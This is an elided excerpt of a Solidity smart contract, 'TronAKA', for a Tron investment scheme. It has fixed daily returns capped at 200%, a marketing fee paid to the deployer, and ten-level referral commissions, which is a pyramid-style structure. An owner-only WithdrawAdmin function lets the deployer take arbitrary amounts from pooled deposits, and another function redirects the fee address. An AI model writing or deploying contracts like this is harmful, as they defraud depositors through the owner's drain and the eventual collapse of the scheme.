...
contract TronAKA is Ownable {
    using SafeMath for uint256;

    uint256 constant public MinimumInvest = 103 trx;
    uint256 constant public MarketingFee = 300;
    uint256[] public ReferralCommissions = [500, 450, 400, 350, 300, 250, 200, 150, 100, 50];
    uint256 constant public Day = 1 days;
    uint256 constant public ROICap = 20000;
    uint256 constant public PercentDiv = 10000;
	uint256 constant public ContractIncreaseEach = 1000000 trx;
    uint256 constant public StartBonus = 150;
    ...
    address payable private MarketingFeeAddress;
    ...
    struct User {
        ...
        uint256 lvl_six_commissions;
        uint256 lvl_seven_commissions;
        uint256 lvl_eight_commissions;
        uint256 lvl_nine_commissions;
        uint256 lvl_ten_commissions;
    ...
    constructor() public {
        MarketingFeeAddress = msg.sender;
        ...
        if (user.upline != address(0)) {
            ...
            for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                    ...
                    if (i == 5) {
                        users[upline].lvl_six_commissions = users[upline].lvl_six_commissions.add(amount);
                    }
                    if (i == 6) {
                        users[upline].lvl_seven_commissions = users[upline].lvl_seven_commissions.add(amount);
                    }
                    if (i == 7) {
                        users[upline].lvl_eight_commissions = users[upline].lvl_eight_commissions.add(amount);
                    }
                    if (i == 8) {
                        users[upline].lvl_nine_commissions = users[upline].lvl_nine_commissions.add(amount);
                    }
                    if (i == 9) {
                        users[upline].lvl_ten_commissions = users[upline].lvl_ten_commissions.add(amount);
                    }
    ...
    function WithdrawAdmin(address payable _to, uint256 _amount) onlyOwner public {
    ...
    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        ...
        MarketingFeeAddress = _newMarketingAccount;
    }
    ...
    function GetUserData(address userAddress) public view returns (address, uint256, uint256, uint256, uint256, uint256, uint256[10] memory) {
        User storage user = users[userAddress];
        uint256[10] memory lvl_commissions = [
        ...
        user.lvl_six_commissions,
        user.lvl_seven_commissions,
        user.lvl_eight_commissions,
        user.lvl_nine_commissions,
        user.lvl_ten_commissions
        ];

        return (user.upline, user.totalinvested, user.totalwithdrawn, user.totalcommisions, user.availablecommisions, user.checkpoint, lvl_commissions);
    }
